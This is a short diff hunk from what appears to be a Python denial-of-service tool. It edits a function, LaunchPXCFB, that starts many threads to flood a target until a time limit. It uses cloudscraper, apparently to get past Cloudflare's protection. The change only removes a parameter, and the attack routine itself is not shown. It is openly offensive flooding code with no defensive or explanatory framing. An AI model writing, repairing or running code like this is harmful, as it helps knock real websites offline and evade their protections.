@@ -885,12 +885,12 @@ def AttackCFB(target, until_datetime, scraper):
 # endregion
 
 # region PXCFB
-def LaunchPXCFB(target, thread, t, scraper):
+def LaunchPXCFB(target, thread, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     scraper = cloudscraper.create_scraper()
     for _ in range(int(thread)):
         try:
-            thd = threading.Thread(target=AttackPXCFB, args=(target, until, scraper))
+            thd = threading.Thread(target=AttackPXCFB, args=(target, until))
             thd.start()
         except:
             pass
